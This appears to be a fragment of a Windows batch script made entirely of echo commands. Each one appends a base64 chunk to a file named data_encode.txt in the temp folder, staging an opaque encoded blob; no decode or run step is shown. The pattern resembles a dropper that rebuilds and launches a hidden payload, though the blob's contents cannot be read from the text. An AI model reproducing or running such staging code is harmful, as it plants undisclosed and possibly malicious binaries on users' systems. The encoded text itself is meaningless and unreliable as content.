echo xaEU7jQxBa3CDRKplDSLyW8r5Hp8D6D3U+crWApyxfWR70XyMVZsV9kFK4gUDSzE >>%temp%\data_encode.txt 
echo o29eEwuBJO7iT7j8HpQXC4sYrD1oBVYkya6IZOA+tdLhCV0EKd8LlAQsKf2fdKXV >>%temp%\data_encode.txt 
echo QvMySjToq13cAhAlAPXYON74M8Yir1Ef9zCOT5OHEfelJqWEeaIE88GuJUxNHSzq >>%temp%\data_encode.txt 
echo 8JRInVvRqYKJY6OlkUJaqfUVr8xovAzhtbj8xqxXppRS5vbc7OyCV2gyXmg1jtK1 >>%temp%\data_encode.txt 
echo 1FIBSl9KTlQ+nXdleX6pryzs3XTfwt74U0AsLEl6YUhkMNvt4tggu3RGddUuZWoJ >>%temp%\data_encode.txt 
echo ro+QywWmR1dfkLYzu+u2VfTyjT8VbxiNr/mllfW+Ok3r0mva3imZlewpOmt2yYut >>%temp%\data_encode.txt 
echo uH+lqy1cXpvZIlZtzU0uzSzMkiMhKcAyM1+enFqY3frq+vz0ra3Zmfk1mMczYpqX >>%temp%\data_encode.txt 
echo Xo1WCZ2phqdRyVH7aKNRaRpJZvDOZkpBodcalNI9QroylSOeHUnrwS6mZCxyQW1o >>%temp%\data_encode.txt 
echo RhNNULmpuKbwo17klcRmQkGxeIXh4bhGE0ECUSmaOyPx33bRGSGKoxXLbVLeD5Eq >>%temp%\data_encode.txt 
echo flqMcF/4dkXEOpVSa2z0aaLbPrr5IE0R80f+5mHLMdArgec3IARKb0fNW0SVS094 >>%temp%\data_encode.txt 
echo fDL0CIOboQc8Lhm3gLhP1KsTwc73iUogIkU8t2iASKSAcIz6qMcwEHYAFkjMmt1f >>%temp%\data_encode.txt 
echo vPcu3XqMZ1QfHWUyPwwOcO35g8dvP/P5P38m84PP/PilH55b+PFLa7A4xKUFJnrh >>%temp%\data_encode.txt 
echo vvCW5eJO/HYHM5TYzHKZ0nCUixcHhwSMldlMZuHcpzM//7dLUx7cn2aeHfjsuYFX >>%temp%\data_encode.txt 
echo M/cGoBH4/ZVz/Dh7/LUHOHaX+PH35+lW56vB/a8/4ZfG/vPfDGT4AeBMHIV/yT8S >>%temp%\data_encode.txt 
echo P3Qy/nc/lfnrX4K/Tz6V+atn/udOSFXwjEE8HfzOAEfo3kD4Elv4+W34X9FAvsPn >>%temp%\data_encode.txt 
echo fz8naEfyvzYQPWz3iVJx6Ljq7794jvMsub+eKAYHSDQD7ZnnsaEEeG2nXYXPxBPg >>%temp%\data_encode.txt 
echo DeHoxsv9/1m3/7d/1g/+9eFHFz44P4Tj6+iF5/9oOnPYwEtBPxp5svn+wcf++4Hg >>%temp%\data_encode.txt 
echo /Vzs/aP1CwfPDx29oMHrg4823398P/P4L64E8L33c0nvyw8/GoIGvvXcb2UO95cH >>%temp%\data_encode.txt 
echo Mg8/On/4X9MDGXiWsacyj1649K2pzOPFTz6Y/YSuK10YunSwNvS5x+v/CX8ufDAz >>%temp%\data_encode.txt 
echo dP48FDv8j1sDmT/47ttTmXeeuF/7w++/jTVfg/be+Vv3hQMo9OjepYNfGzr8ERTj >>%temp%\data_encode.txt 
echo Lx7+/Kfurz76daxy8Ca8f7108Lmhw+9I75+4L8jvV/D91+H9YQ0LXcQ2Di4c/jLg >>%temp%\data_encode.txt 
echo eniNqhG+Lz66iAgBwVDtAqB7/vDvYbYdvH949PpABnH43tJA5vEPXvb58+LB5ieP >>%temp%\data_encode.txt 
echo Fi+M/NNB5xcjHz967tHAxO/B3Hr2d9+DEhOP4aNTn/g0/HGfOfjHR51fPNr8BLj4 >>%temp%\data_encode.txt 
echo l+czSDxCAVZ9Fv4cvgcNPPzknJsFHvydeCgaEvw++smPjuDnwz/Dquekqg+h6of/ >>%temp%\data_encode.txt 
echo 8u579CwAixeqHNYF2OfeefLs7zyA6uLFh38iQaGSE1DynY/d7xxemwJw3z74eOL3 >>%temp%\data_encode.txt 
echo Ee0/nvg2/vnezyag8rvyD9C/+bN/AA6K796dCyi78T73Z+H38+IGhm8i/vgLBY6g >>%temp%\data_encode.txt 
echo wBEUOIICR1DgCAocfZPrsNFRtqjuMVj6Xcu8G/kZBJUEK2owlTQ8ZqQGdgAsVbWi >>%temp%\data_encode.txt 
echo VStWwURpq2ZRM9rMMeotlTaAqS6+p2Na+Huo2lYGY4DFj46xpTE8tcsGnatrfi3a >>%temp%\data_encode.txt 
echo +N/QVU2XoaOCrOEmOH42GPvCZbOTT4cu4LONy84mNKK6rt606ZwUR9e3QdXW8EzT >>%temp%\data_encode.txt 
echo il43WrR5GLB+YNgIefCyk3nsvpypqrSzcCw49QdRaKKLW9cA5GWnS+Pw49fXd6tm >>%temp%\data_encode.txt 
echo RxOH5vQPiLGcTdtWWZWORHAbwGA8RaZBm+TaasupAY0AF8jkR+VqFFkQdKAdAV/B >>%temp%\data_encode.txt 
echo flFtMDRg4YXrrqn5pcnVu2RcUIgiDLXKr4DW2HrrnmGjfWLrbXMvP5gBoLjFMhPI >>%temp%\data_encode.txt 
echo o2mvLB2gc9m57FBeDH7A/5TBwcz60r35Ff7v8spaBv7ML91Y9v7ioy7801v3Mb44 >>%temp%\data_encode.txt 
echo xjzzCI92bepNq71HDfnHcmV68J/YrePCrIqnsIyzosZgWEH/a9160BufzY7jirOq >>%temp%\data_encode.txt 
echo 93BE63jbNh10zA8Lci0POOcEQLcozNp9ePjw/fIM1qga9Ayd1aS2mNWq6ixHB/ZY >>%temp%\data_encode.txt 
echo LQy54XQTBzBBj4Twq+NxH5pebe9xUHjWz47VFp1TXPFRCvrPb/8eB1HxTiMS2CCP >>%temp%\data_encode.txt 
echo YRBQhhkNlxwfh9SdDPrGwMXrV/JpZPrwa3TAl9raw+FVwVAZgocJV6wWWNGEXxt+ >>%temp%\data_encode.txt 
echo Xfjt0JAs3hcoYLyMDv5IbCLoX1gfAI0tXtnyzhXXtXHezTi9i9ZgBgOhi3h7yOM/ >>%temp%\data_encode.txt 
echo JWu3OATLArWim2D0N637SI3DcsWhITZxHVixq9MKfdvJJxMIlN1h/unIk9MLWPnO >>%temp%\data_encode.txt 
echo HayMEUPbv1siDwuIogNrXNzxgTT5gsDBwle2riR6WVN/iouM2Yat+zluWRwzWejz >>%temp%\data_encode.txt 
echo ut4ezLxSYF8psI1NltOVulJg2Q21+NbmKwrM4Gxe6n+vby9rymUN/nOwSy47BVbZ >>%temp%\data_encode.txt 
echo Yzfbep2tWrpp1RwhJjAsUbOK2Pe40dyG+b1gODzeW2BgKuvD6B8poKhtG5WOiztH >>%temp%\data_encode.txt 
echo jAfwLwoVvGEde72puw3Mz9bdKqCmVnDPAXLDGQS2mAgvx8Ul3xFtOSTGdvFN3jvr >>%temp%\data_encode.txt 
echo AfqFi7agpxlSBxKh2oB5kHNAL9BBaBv4eBPvSdnD4Y3ngplaVYVpQWJYOjuC5BVF >>%temp%\data_encode.txt 
echo mjDUypgQd2yjODLqNM37041Fd+3BJgugsg1ESlEU+FTc5SjiN9GXNPQ7LUTrslO8 >>%temp%\data_encode.txt 
echo B9w9AaiuAmSwqQqeAQFFcbajmDhj4QGDg69htV0Q68Yuy5oOTLusdxxkTtNrSh7Q >>%temp%\data_encode.txt 
echo Lo4waWQuLy3cLZDgwQwLE9juQWuCzNE1o9NMAodwRhl7CyVKAAyGA5dcrNgYLrrD >>%temp%\data_encode.txt 
echo xQdQzITph6dDJkPpdzLcZ3i1TQVGSgHkmOkaRZwHHpwuHGwaTlU3TbWlWx3HZxzi >>%temp%\data_encode.txt 
echo 3xAJQJ4RIhPveu9cy1VNrvKwD4R6d1DUkXYyTQT1wCvuKeX/7uxoY9uqri+OI1I3 >>%temp%\data_encode.txt 
echo xhGKW1OS1mlfSlJiJ85HIaWRnMROE0jSLHHa0iSEtHUhNN9+phFCJcjx4OkRFrZO >>%temp%\data_encode.txt 
echo GtOQ6Arsg2lD2lYojDYh0FLYWFuhwSgaaGPDj6ysGlXUNh/eOefeZzuOKdZ+OPfd >>%temp%\data_encode.txt 
echo e885997zfe97eQ+MAYMWRP29Nk/eXt5LXWg+5B58ICr0RujQe/owI+JMAZwawNmD >>%temp%\data_encode.txt 
echo 78H3eW09/T58CINe9YRpBIw3YtXSjRjuU4zfP0D8p8c1uNJcX7+4o6F3qPslfBue >>%temp%\data_encode.txt 
echo 5m/2+Ht6JRidO55vIMNSCDJRWALLLLjr13gtrLhOEmVgBND7aK7KG71jHkMkz7HZ >>%temp%\data_encode.txt 
echo x9Oo9n5Q2E6hqmZ7S1NXreeeZndXU22rUNXa2FXTUsMdv5a/bG++p6V+W52nq6bB >>%temp%\data_encode.txt 
echo XdVkzW++G51bsb1iBAwXkgP/XvQMzGNRDuHzD+I/KkD0FZo8ra4ud1WrsL21hMpW >>%temp%\data_encode.txt 
echo t6fLVd/SVeXxtNRXC576Rnerp6oRs5/6XdVVNXe3wWWru8td29Xm6cLu62cHwD+A >>%temp%\data_encode.txt 
echo bmtqrWupb7qbT64IGeKw4/x8D4DiHIiZYMzk2DIR3+WubajyuDeXaasrA2SXdz8I >>%temp%\data_encode.txt 
echo wru5LF/qK4jF29HY2uVx7wKGbG/aIaxoj+YThdrno3i04LECPFRxubaDKI7bPzHx >>%temp%\data_encode.txt 
echo JYouWiCxW+lxRO7ToaPGbm0d7PH2eoftVvonPcMe//0QYnGCPv4UAP4r5paiooMH >>%temp%\data_encode.txt 
echo D9rRQ9vAsOwDw/cXQWkDaPsDUl8v/seD19rirnI1uska93lhkF7KSeVZPr8GfGQH >>%temp%\data_encode.txt 
echo hErvrmJRzktflWKJQDfb0eyn0eDv0tEG/XuKsAHqRdY7DThcEpDEEpohzWqA3mUC >>%temp%\data_encode.txt 
echo Buylmc0Yl8qfhSIthrTbQON97ZCJYcQb9nUujyAx4QMv97GUESMSf57Xyt5miC9U >>%temp%\data_encode.txt 
echo i8lamd/isaQQ/YcXd0pLgm8hQwBydxqssQMvC612ZonyLOSVkN0szSDXs9XYdpOj >>%temp%\data_encode.txt 
echo Z9G2wJ7YEtB9DlrjZgmzwNSnEF9b2MfvljLHjNGkx6fB5bN4x99bh6T2W/HzDT58 >>%temp%\data_encode.txt 
echo hN87wvwfgy3UvjOCvkPz8aQaWuICyslTC8xzupGaH4L7ICY9cTR69lv7vXjQ3w1b >>%temp%\data_encode.txt 
echo BDaxh+lBWvxWaYQKDwKG5Q57qbPOj+Y+tE9YJjJNKAZkeZz+RDRlSzJhdMhqHfL3 >>%temp%\data_encode.txt 
echo eCUuKNvQEEqPmrzDxMB+fOc8fm8EPzpyEG8UxDEySqwb9px+acAGCRbASpT705di >>%temp%\data_encode.txt 
echo WKpnxSw9hgzD3lnvqdve5sFNJ+zUkSon1g2bXWCutaqhgYN2+4gcEnoQc43+A/Si >>%temp%\data_encode.txt 
echo QBD7vgG+uT7gjezVengKDpkCaCpPFopY4NXcGlpoJL72scfYIvEzPtj2kmgBuIGA >>%temp%\data_encode.txt 
echo Yah830Cft8DKwHGDNow4QNBWVuJDyB0AOYxOqN8KXjYyLHuW1odHDsv03z3S3TfI >>%temp%\data_encode.txt 
echo dBm/OoKGY5dG2JdMaJOIcy7AhIUZFaqmAxXqwQFUY5Cepi2Qi3DGcdtGCEoEtKyE >>%temp%\data_encode.txt 
echo cNGgDZhFcCMFq90/APsD22ZfRBdg6eCOe/Ff1yPCBxRQe0232UvNvQdxK7Ik3rY5 >>%temp%\data_encode.txt 
echo JumEM/D5pdBgqU4IXSiCP9/9sSAobRmyR9Szo89QFp2Zdk4LPT2Cbbdg2yfYRnDb >>%temp%\data_encode.txt 
echo 0rZzR2vg34WOC3iSNpjnFPhRayhwu47O4Z57I9r26eYlbXg2FnpvadtsOBwOvbK0 >>%temp%\data_encode.txt 
echo jc73jkJb4BHRmaI8IrpMh6cVk5zTO1Yt4JnmDTCWslo+lfIXxSO6FF3FqeGbedgz >>%temp%\data_encode.txt 
echo HVs1eq1DMoxeK5LSmipO+b4Cwul4MleLIyxmOQW5TAy1levw3LUKO3X8BHEoj/VV >>%temp%\data_encode.txt 
echo sL48Gt301OepgjCv9IqukxIAHEdoxa//+kVT8N1UQsy4y+wU6Bxy3CM65fIrgWph >>%temp%\data_encode.txt 
echo XBJdSLsaumRJ1CNLh7IFoCtPm4KjgIit4y6A14uhn5lTBHkaxnAGL8q9YvaIPnhB >>%temp%\data_encode.txt 
echo MsgfBd4qbL+3q3NakcRsXGmtbP4JsCA4e6hzgq9XoRZljelY6tikVDixtcM0djOQ >>%temp%\data_encode.txt 
echo VyrTX6hBJmWLKNXQ72BRKdME5b/AkJoCb+qDs4zko6/AGE4cQ8axGsRsx6Sy5qgE >>%temp%\data_encode.txt 
echo XQh1Rs755MkaASjlywhjHIQO01NHdcQAujembHKE4Zo+mCxXjuA0LzLagGExjfUC >>%temp%\data_encode.txt 
echo rJJzCXgTvGAKvpCCTJVEy2vIz5MHkfXnFLv8FfL1CegEqeePN+oUoF7xiGiRjYgJ >>%temp%\data_encode.txt 
echo ahCcNB372jRWnhIzcoNoOYIDnaavgMp/Knh7akEn23CObMTROwX/moBLtOgRVknB >>%temp%\data_encode.txt 
echo Y+HfAuhR7ATGQ2Nwdvw7eklUqvQg+ofZxGHwfPlDEEt2wempsK5ggdHE9ShbgmFT >>%temp%\data_encode.txt 
echo sASUFyWlmMdwveclQyj7A0FQXYth5IX+ZTPp86tPVguhDWU6QXbR+X9Gip5pHHZA >>%temp%\data_encode.txt 
echo P84ibN71/Rph5iTp0fGOwWrBcV4uRzbKRmKiGYeeeRrRLsWQ/WNpEmRfNQBR9dcL >>%temp%\data_encode.txt 
echo 4fAEiNgaPG8a+wdMEXhsUWzPIfW502giQsHM1JxOzkGxq1MAIc/C6q3AB0vw4niz >>%temp%\data_encode.txt 
echo 3hQUYMXzSvFreNx98mGS2tcv+h9FwePESQwVAC7tBOGKwVlpY0RKvaLltJvu4RS8 >>%temp%\data_encode.txt 
echo LbNxohJSkKfAbtR0UDj5XMGUbMaZTV3VFbwvl9OMAjAjxpowZ0olMeVNHCOFjzHe >>%temp%\data_encode.txt 
echo pld34+KIrtoJl69jn5yDzJwJnUotUj+dp1sCg8DH0EslOkF9bJ4EllEBLY4zaLyy >>%temp%\data_encode.txt 
echo kcwYXACacalmxlvF0C8tzIz9b5AJd4AJZzN/qd4BZOLzx52OMHpMtKliIEX3cmG1 >>%temp%\data_encode.txt 
echo ZTJq4ibQpSxce+BtvVLSBIadqbShIq0Y3WIzjX2KhpCjHyObGTsFtSN3YGXSf5ti >>%temp%\data_encode.txt 
echo dOLVGX8u6OuKI07WnKVUZuBVWNqm5IiEJ1WiShSvjqrMM44kVAanimwLVM5Dm+7Q >>%temp%\data_encode.txt 
echo SjJU2Yw1xZhPY0s3KpU0CJjCF+SLdpEZmILHodYE4pLSQccyYTo7yfBgsbIjUOkC >>%temp%\data_encode.txt 
echo qBR506HUWqlYKe8ljyZlKR1iptwhFgfeykanp755Awk0M3jR/znOBnV45uNQO5SO >>%temp%\data_encode.txt 
echo SQ40fUTPFp6vVBJnwv61itHFOJOlmJtpPn6DkrOVMWMVqE4lGisyXS4BdcuS7TO/ >>%temp%\data_encode.txt 
echo OU4aYsSOmX/ym4uh3CKMA+BzTMfeq8814trUW8PMsieAnxADOUe3FSfBUTkHuaZ+ >>%temp%\data_encode.txt 
echo CApJUlRr4GrCdKI6ZXy3Dj3SBIw6EQiJgSs7TI9fxvtFYvByoVOYOGx3Cp8VX//X >>%temp%\data_encode.txt 
echo nARM/O8P34YD/YsxMNlFieEqoH1vTN9YHFwm/Bzwa+F1Hy+fvc7YF+G32uEUCuHX >>%temp%\data_encode.txt 
echo AL/7YB6vOFjfDC91JazcwMtGKPvh9yP4neNtX0K5shTowK+hlLXdx9c0AvVtcfYK >>%temp%\data_encode.txt 
echo EdJ0YrIG5BEcAvk0gWEGZ01PPQSWTZZpGjsAl2SdVdCvdkIN9DtbMZaBTAuuyn+e >>%temp%\data_encode.txt 
echo +s+67blXZarLs47wzK/CaXg98zzAWRSjh8G9O/Xlurtyz8lUn/konEblKMAYHGdk >>%temp%\data_encode.txt 
echo o0CO7TXSSzNW1D1hGsmAGpxO9LjWYkV1sd4Vjsmjmdj5OO/M1LQWOm9RjNa4SWJd >>%temp%\data_encode.txt 
echo 3YV3WNPocmGRII0QfMiY1a3QxUlR/RMC8NcpxssYys9AFoRxIucyD7PrA4sphzYB >>%temp%\data_encode.txt 
echo 15qAXbKZmrfYJAtlHqax5wC4hmUhV9Qf8DA5sSrqnOYLk45nV+bAfrTJon2r31uM >>%temp%\data_encode.txt 
echo TJbqRWw1mSeprZJWeADaEIEqN2rLBY7XYUMjNHCmU/3igsa5hjjOYV1du4ico8vp >>%temp%\data_encode.txt 
echo BbaYszGLKUpmMUvPazS/q/oiI6PLjR0Z6+rzCzgyXdYTpCn49AJbGTWWMfQM0Ad0 >>%temp%\data_encode.txt 
echo kaq0EFkY1bOo39+omCklO+9vliOp0m0ow1KSYaPAMq/RCpuUy2X4yTwmBtr5nSbM >>%temp%\data_encode.txt 
echo UyyEUnKi2rlkm4EZai5jstlxHlTX7KS4jVFK/Wyez4nJjHUZqcuP9tYBGUNqmHlc >>%temp%\data_encode.txt 
echo /NI7YFzl8gIbsCDcs/ORZVG9kszRvzKchkFAtSMZigexDKSuvfNRUhjE1JYoKar/ >>%temp%\data_encode.txt 
echo d04TQH4cPvnxDfMoALp8h0FuVMyFUOUcf+zLLzDL/5CQrsnUpX4FkI+l4SV2ki6i >>%temp%\data_encode.txt 
echo STPEgmszZ8PUqT40F9XLYmz4/VxkclRvm4vOnoLJ4bmI6lO9bC4ifyfJP9pP9aw5 >>%temp%\data_encode.txt 
echo pjR/w3BEAXNSWuk8Sqy5cg0GY+Ge6qFrGiea43wX1tWb55ATdHkCINttuzutgrY/ >>%temp%\data_encode.txt 
echo wdynzHGBdhdmTKnAm/5wGv3oTTyFp00k5I+8zP65hUrLBzdRmcXbM/mDHhl6Vka2 >>%temp%\data_encode.txt 
echo bWctUYM7kc8MDvKIjG9Ka/QTa6II40kgWC5ls5lYuX3yMoOX6VZtJrdECZchYSDK >>%temp%\data_encode.txt 
echo zX85YcckcOIwJDJl7XWBzwz3TrNt+vVWnsbH46W+eF10vLdu/faFZBTnEsH0n5ZS >>%temp%\data_encode.txt 
echo qR+0RgkEkiCQfmY1R8yNIt6VBKKYyYRq5azK5qXl7OrkWPvy+uiAf9347QNmTjHC >>%temp%\data_encode.txt 
echo GbxMf0ebuRglNAGE1J1gAHn7DJobhkw9UIk2mHqINvC3si2uvm1zFG/XRjquyKDd >>%temp%\data_encode.txt 
echo 5jfJFzJUfGzs/5Xn5bxo6OB6kVibz8YgnUwGKfTMQylsuJwoZjDJ4dJfymF89MQg >>%temp%\data_encode.txt 
echo 1yWL/HoC5JXJIp9NgPy+mCSyce1y5KeTRV6VANmTLPLaBMirk0W2JUD+eEOSyLcn >>%temp%\data_encode.txt 
echo QH42WeTqBMj3JYs8mAB5Q7LILydA/tf6JJH/ngD5F0kiZ61ax+yT22nGirhIc2lt >>%temp%\data_encode.txt 
echo jPw50f8BmHCH5b08AIBDS8w9DXhURZL9JjPJkB9ekAQCJvDAyW5yBshI0ASCZEjA >>%temp%\data_encode.txt 
echo ABEiBOEETkMyaI6QYOYNiIvIc2Y07x5zoqyue57nx4fnd+ve/n26gcUTmQQQ9dbl >>%temp%\data_encode.txt 
echo 51B3s+uysuqMQ1T0NqIRclXV781PMklQb787vo/Mm37d1V3V1VXd1VU1I67PzTEj >>%temp%\data_encode.txt 
echo mXxFjcw2NDcE351CZkjLzlLmthx4BsBA03TDGoFNfxgD+siUKwONFo7gQ0OCLksA >>%temp%\data_encode.txt 
echo uukKQaOtM1g0JOj5CUCPvkLQaGENnpSGAr04AejnoXbo1i8HuG8O+of7E/NetpM2 >>%temp%\data_encode.txt 
echo QObb1vxdF7rxwh4jeIq6U4/JC+3dUX8d9XcH0HE0sv9VT54M9XYKcrJyQfIc6KlW >>%temp%\data_encode.txt 
echo X3OfV9P/pVLpQ8/PHSfUWQhb/ST8DHUSfmrAedNzPl3v3W32HEnvQnNwNfQM+zaq >>%temp%\data_encode.txt 
echo H04w3iot+wVAEfbHtTvX51wO/tt9RLkiHI/91fjzhJZ9fFclW+yDcwE+iO2vo01p >>%temp%\data_encode.txt 
echo 1hF87hi3UKWn9rr0Yq3GVuRQ4Y/ni7QdrwbN92Fb7Gbn4hxBy2gnm4ronQPN7b2+ >>%temp%\data_encode.txt 
echo bnUWlojeNQgu4+IjlfT2HHYs24rRjP4A1jwFVB299yt8fVjOoB2s50iVegLprI8Y >>%temp%\data_encode.txt 
echo 6hdF6Yvr8KK/kml5Z2FgsGV8hG9dbkFaryVPaiva3SIc0oi69qJF7ZIXQRdj+FiO >>%temp%\data_encode.txt 
echo CRGC+OtgOFm24GeMD0f0fg+2q56+y3IGELDI133/rlAjlBzAse3DkYY/4EDs3XjX >>%temp%\data_encode.txt 
echo 8OIkYNE8/H4Q9TR5BKPBzwPlZLx/Dh72EQEOUw3ROxGrrLWZud0RqvyAYCDsvbyi >>%temp%\data_encode.txt 
echo 6HvzMpkgEa3gXQMh+M6iaeE0bs15sfxfCKYY6sEh6rBKVAkfQP/YYFojWcCLxP0n >>%temp%\data_encode.txt 
echo QiWXB9kf0fJI1VU09m63SURENHvVcXPmk0w3Z2arb6MJDk1iaBjW9y96YyDgo3k6 >>%temp%\data_encode.txt 
echo wr+CB/WYr/cAHs3k13E2OMGQXLvGokO81TCWzjWgpyJLtELL8BPUgCiKdNwY3wDF >>%temp%\data_encode.txt 
echo gNoVPhk5Pxy859aSqw6ody64Bjg/CzC1qdkM5hzGKh3cDS/3mdG4lm19FDl6jBdO >>%temp%\data_encode.txt 
echo FoeIxQ/ghUXvXqzrKO4UO04FgtaZ5se1bKy/D4vzcYkKJ5oOW7xWq0YQKghaIJhj >>%temp%\data_encode.txt 
echo P0FvAx9aZ2Y9aEAXvIfbO93/rqUBptoKM12XLUE3+Bqb1biPyaCq+wOe4ya10/Op >>%temp%\data_encode.txt 
echo IP4M+s7KFTuOFHe2Z+XSeCqvYDzRkRznIwlZtawH7Sc9fWkq9bHj+2JHnS1Ny8NF >>%temp%\data_encode.txt 
echo 2luZYxK9v6ILMIsF1k9Zp5xGE+Q5kgWLTcvD1b/3+2ie79phUruWcBng6euX79cv >>%temp%\data_encode.txt 
echo CF+m+7P9BHyJ51WTetzzCQz/uNhxRuwYXXyyfTQNfmFxQOw4CYPXMpDEM82PfAOS >>%temp%\data_encode.txt 
echo KtAxp6rbbz8cWgUDhYGnwcBD8+GZzx4ZiAba5/j44oZ3NCY+Y4XGuQO0gpZHLHDS >>%temp%\data_encode.txt 
echo HlD+FOlY0zI4v2At5V0a7mtNp2i4BHm+StgEPsyxv8bfA+Vnpu9Zw6neNWA8K4g/ >>%temp%\data_encode.txt 
echo gS2tHCRxakK+lO/iA4qXzwP5c883IKZnAH+u6Yq9f0CNka7hzR0sYv8EUmpdcplx >>%temp%\data_encode.txt 
echo X3poLOCN0SNlgujt1E87pOKg+kdUXU6qDL/l6wbNO4e5qwFUEb6bb4CaF8c/AG8a >>%temp%\data_encode.txt 
echo wbuPAcB1AwA+FQH4pgEwFa356WTNR3lw7QRdzCyfoIsZPPDLvw+u3yOg5PR+LJAm >>%temp%\data_encode.txt 
echo MKNAuRHrwOd3TCQEJfWoViZc9Of6sA1Cy+CDfEX0PivwwxrIDZuWpgmegFlNU1M8 >>%temp%\data_encode.txt 
echo r5h33jhV9Jbi6xvg20B+OzQJBroohkZfshiUoIvXcrALdw5MEN64oqCjGJr5UC4c >>%temp%\data_encode.txt 
echo Cx/CC8JjyWwhp5LYkSweehvKKmNAPjwA5FYCKRsgJyJIwDj48XgC+SLeoC7EZSLb >>%temp%\data_encode.txt 
echo JC1ZOFoNKCbLdkRN7dTSYudDsyOiiNhi92d4+Yc3qq9QXJxq5Zd+yLxEFdQOaeoM >>%temp%\data_encode.txt 
echo MktpGbXY9Rhxv/k2z1lraBN0h/pmYLkJyhcSfAMz0eskBTtVLtTyaPxjcfx4CT2D >>%temp%\data_encode.txt 
echo xh+tWM4rut/CL+8ZOg8ndAHUpIkPnb0EJagcgC7zMkhXhEZBLUPezqLxjIbx3ILj >>%temp%\data_encode.txt 
echo eRqqa3Op7AYouxXLZuPFp15fv45DNSeJHZNu2tkHk98dDTvywkie4HIcYIiHTtME >>%temp%\data_encode.txt 
echo Pcvi2fjNcTTnUwciuHQcR3BSeH/EH2GSN8I/HJy8JBaUNk6f6wGgkghU+GUYkG9F >>%temp%\data_encode.txt 
echo fwRfz5FM9SIsli79+15C1aqjH/6lPj8ToGAF4n4rzg8Nov1tuROwle1x/iB8YNoY >>%temp%\data_encode.txt 
echo o9td2ToG1OARaOD+PRp9b0A4oekDw6F2Y9SqmVlYMkthVjaKpbI0ls4y2Ggmskw2 >>%temp%\data_encode.txt 
echo hl3FxrIsls3GsfEsh01gE9nVLJflsUlsMpPYFDaVXcNsLJ99h32XFbBC9jfsWlbE >>%temp%\data_encode.txt 
echo prHpbAYrZnZ2HZvJStgsdj27gZWyMjabzWHlbC67kc1jFczxf9z7/G8bzmgVAIrC >>%temp%\data_encode.txt 
echo AkwQHIIiBATB5DAppoBJSHIkKUmBJMHsMCvmgFmwOCyKJWARkh3JSnIgWUhxpCgp >>%temp%\data_encode.txt 
echo gRTB6rAq1oBVGOUYpYwKjBJSHalKaiBVSHOkKWmBNCHdka6kB9KFDEeGkhHIEEY7 >>%temp%\data_encode.txt 
echo RiujA6MF0SEqYkAUoHcBehagVwF6FKA3AXoSoBcBehAAugCQBYAqAEQBoAkASQAo >>%temp%\data_encode.txt 
echo AkAQMpVMYYwyRrhKuUoYq4wVspQsIVvJFsYp44TxynghR8kRJigThInKROFq5Woh >>%temp%\data_encode.txt 
echo V8kV8pQ8YZIySZisTEb9pJyvMRsnFVgaJSnEl7hXEU4qXzgykpj4FF7CegIpvZbL >>%temp%\data_encode.txt 
echo UMmM5xTRW8SvVMrxnO5v6/f1qrMQhL/ZViG2WxDkXH7OSblJpSf/ZgHOcsOfjwLo >>%temp%\data_encode.txt 
echo PJPB241xqPSkvuX5QPQvE9S3lA8+Qa37sdm/SvCbJ76MImouBgButfFlpdY8xSoX >>%temp%\data_encode.txt 
echo uy8udf+r0ocvxMdAt3+qfhY4Z1L/6OtXL8ppyhHElzSe4RHgX2sr92+3lYKYz4Gd >>%temp%\data_encode.txt 
echo elbMgdjKBD3CEVVUkS2o3sf31PJ4jHE0q2+HfwpCvRR15g4PY+GPNCLDUoMeYvs5 >>%temp%\data_encode.txt 
echo UxQnQceJaDEI+5+YolQbr1NteOw9Fyu25secjyP47/P0VYiPwV7xQhT5PtF3C7/P >>%temp%\data_encode.txt 
echo ydxdXUFnM8C6BM8m6AmBWGdWc4OtYQ7AwH7Ees92Hes8wFr0paL6a4ajHbxqfwD0 >>%temp%\data_encode.txt 
echo xBeoE+C8MhcRWQZ9zeUYnSQfCo5RUqWaF8U9Ayss8r2qZvCaT2LNabzmSrZAncaR >>%temp%\data_encode.txt 
echo V89E0Pa8JyLmNwuEub9ooudSxdaCOHmq1vxzBcf/acIf+PYz9dPAuyb1LcTf/bec >>%temp%\data_encode.txt 
echo g2GzbuLTygmx3VZ0CNkeKeGvgb1aDadG7aIoNXRXE4MoQeV7OkWKkQ/y0MEET2D3 >>%temp%\data_encode.txt 
echo Kgy3v6W4V0LlGTp3iXYKBahX18HL8BnYB5T6TsmrQK/imbAItD/uDgFCCVQsRwYk >>%temp%\data_encode.txt 
echo 2vJwYDwupqvNoBx+wx2zStUuPKqNUWjvUICdWninxaEtXF1nAkiEVQRwCrQ6HZYO >>%temp%\data_encode.txt 
echo B9XekRQ6570cwwpFh5KRAnVAAWgEFYkCJ+AlTW5wykp42xn6e3zOhufQLHxK46Wr >>%temp%\data_encode.txt 
echo oN9gfx2UXoNPf6mj0sqv4DmEpQK/niwlQt7W7+tW6USEDj5iOzmvJFofau+gFfIz >>%temp%\data_encode.txt 
echo lohLziBr3CwAr7xHvNJj9q/EJfKSsUSm6GJHTX8a2OOLpe5njeXxW/WdwPsm9S++ >>%temp%\data_encode.txt 
echo HjUIJ/++mOUh20r8OA8wTQY5dt+UYHnAZMjbdOdC75eAKS2RcwAqdCfS6IMVRA3c >>%temp%\data_encode.txt 
echo CwS74Tk0GTcUPD7B3rPqVnsv+nTClNUYHnwwr7V0a43PWU/tvqoCD9x1WrmfHmts >>%temp%\data_encode.txt 
echo qzUzlcJ05WpZVAq766y9mX5uaoDyTBhPla1A9C5HxxZjvzZwfe6zDKb9qKOeY1Zf >>%temp%\data_encode.txt 
echo r3zq86MCWVR+iRHUwGpLT/bMkW01rrkR+9ug+bk3st7VC2LHHH3Fn/5g1CWAiY3b >>%temp%\data_encode.txt 
echo /hP4MVcNfn5iygl4qojXB/5yENfLBLFj8umewjc8fdKWzZ6+BjJcyWs95yaXveOa >>%temp%\data_encode.txt 
echo Hbe/jpci98zQso2+TXCUpL7PEj5l77Sd0tI50YLaKjP0fzy8O7hkOczNhfDvPEeK >>%temp%\data_encode.txt 
echo 0CwGOkHsWGVG60b7HjRkVoIaAckP60eSN6BXJN7anuX361bdsU7SjZ60SP9pBXFC >>%temp%\data_encode.txt 
echo p/snWh7qUPWC/RSneiCU5C+aLPza1yM/os1K9+smrcJ3Ci+jj90TdPHeH4XMw+qF >>%temp%\data_encode.txt 
echo iEm1Qocs+pbxWoaKIpYJ3Y7stf0WRAdRDu1C/xmasNWu8iHnf09S7HyNNebr3VFn >>%temp%\data_encode.txt 
echo +HythvkCGQTCZfWUEEgjWyHsToH/TiPgOlflgPPaIPjXjAC/DuCDvIMpqbNVw5xc >>%temp%\data_encode.txt 
